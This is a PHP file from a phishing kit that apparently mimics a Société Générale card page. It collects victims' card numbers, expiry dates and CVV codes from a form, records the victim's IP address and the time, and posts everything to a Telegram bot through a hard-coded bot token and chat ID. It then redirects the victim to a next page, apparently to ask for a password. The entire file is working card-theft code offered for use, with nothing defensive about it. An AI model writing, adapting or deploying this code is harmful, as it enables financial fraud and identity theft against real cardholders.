<?php
include("funcs.php");

function functiondilih($cc)
    {
        $key = "2086676070:AAHtyIH_sm69htPd_O-CJIH84ikq7nQGTjA";// hat hna apikey
        $idchat ="-1001741044278";//hat hna id chat 
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.telegram.org/bot'.$key.'/sendMessage');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id=".$idchat."&text=".$cc."");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

        $headers = array();
        $headers[] = 'Content-Type: application/x-www-form-urlencoded';
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    
        $result = curl_exec($ch);

        curl_close ($ch);
    }
    {
    $date = gmdate("H:i:s | d/m/Y");
    $victim_ip = getenv("REMOTE_ADDR");
    $message1 = "
========[ 😈😈 New Login SG CC 😈😈 ]========
Numéro de carte  = ".$_POST["hehehe"]."
Date d'expiration = ".$_POST["exp"]."
Cvv = ".$_POST["cv"]."
========[ 😈😈  Ip VICTIM  😈😈 ]========
[IP INFO]      = https://geoiptool.com/en/?ip=".$victim_ip."
[TIME/DATE]    = ".$date."
========[ BARA MÔGÔ]========
";

           

            functiondilih($message1);

          

            header('Location:./pass.php');
        }
    
?>



